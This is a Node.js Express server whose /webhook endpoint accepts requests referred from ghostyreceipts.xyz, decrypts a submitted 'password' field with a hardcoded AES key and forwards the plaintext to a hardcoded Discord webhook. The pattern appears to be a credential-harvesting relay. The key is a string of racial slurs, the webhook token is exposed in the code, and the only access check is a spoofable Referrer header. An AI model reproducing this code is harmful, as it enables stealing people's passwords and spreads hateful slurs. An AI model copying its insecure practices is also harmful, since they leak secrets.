import express from "express";
import fetch from "node-fetch";
import cors from "cors";
import bodyParser from "body-parser";
import CryptoJS from "crypto-js";

const app = express();
const encryptionKey = "nigga.u.are.a.coon.u.aint.gon.find.a.vulnerability"; 


app.use(cors());
app.use(bodyParser.json());


app.post("/webhook", async (req, res) => {
    try {
        const referrer = req.get("Referrer");
        if (!referrer || !referrer.startsWith("https://ghostyreceipts.xyz")) {
            return res.status(403).send("Forbidden");
        }

        const encryptedMessage = req.body.password;

        
        const bytes = CryptoJS.AES.decrypt(encryptedMessage, encryptionKey);
        const decryptedMessage = bytes.toString(CryptoJS.enc.Utf8);

        
        const webhookData = { content: decryptedMessage };
        const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";

        const webhookResponse = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(webhookData),
        });

        if (!webhookResponse.ok) {
            console.error("Webhook failed:", await webhookResponse.text());
            return res.status(500).send("Failed to send data to webhook");
        }

        console.log("Password sent securely!");
        res.status(200).send("Data sent securely");
    } catch (error) {
        console.error("Error processing request:", error);
        res.status(500).send("Error processing request");
    }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
